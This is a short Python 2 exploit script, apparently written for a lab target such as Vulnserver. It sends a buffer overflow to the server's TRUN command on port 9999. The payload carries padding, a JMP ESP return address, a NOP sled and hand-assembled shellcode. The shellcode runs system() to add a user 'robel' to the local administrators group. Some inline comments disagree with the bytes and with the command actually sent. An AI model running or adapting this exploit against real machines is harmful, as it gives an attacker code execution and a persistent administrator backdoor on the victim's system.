#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 62501203 (Only contains ascii characters.)

# net user robel robel /add & net localgroup administrators robel /add
shellcode = ("\x33\xc0"            # => XOR EAX,EAX          |  Zero out EAX register
"\x50"                # => PUSH EAX             |  Push EAX to have null-byte padding for the command
"\x68\x2f\x61\x64\x64"
"\x68\x62\x65\x6c\x20"
"\x68\x73\x20\x72\x6f"
"\x68\x61\x74\x6f\x72"
"\x68\x69\x73\x74\x72"
"\x68\x64\x6d\x69\x6e"
"\x68\x75\x70\x20\x61"
"\x68\x6c\x67\x72\x6f"
"\x68\x6c\x6f\x63\x61"
"\x68\x6e\x65\x74\x20"
"\x68\x64\x20\x26\x20"
"\x68\x20\x2f\x61\x64"
"\x68\x6f\x62\x65\x6c"
"\x68\x65\x6c\x20\x72"
"\x68\x20\x72\x6f\x62"
"\x68\x75\x73\x65\x72"
"\x68\x6e\x65\x74\x20"
"\x8B\xC4"             #=> MOV EAX,ESP          |  Put a pointer to the ASCII string in EAX
"\x6A\x01"             #=> PUSH 1               |  Push uCmdShow parameter to the stack
"\x50"                 #=> PUSH EAX             |  Push the pointer to lpCmdLine to the stack
"\xBB\x77\xb1\xe4\x75" #=> MOV EBX,0x77a9b177     |  Move the pointer to system() into EBX
"\xFF\xD3")             #=> CALL EBX             |  Call system()

payload = 'A' * 2003
payload += '\x03\x12\x50\x62'
payload += '\x90' * 16
payload += shellcode
payload += 'C' * (3000 - len(payload))


# Send the 1st stage payload to the LTER command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.24',9999))
print connect.recv(1024)
connect.send('TRUN /.:/' + payload + '\r\n')
connect.recv(1024)
connect.close()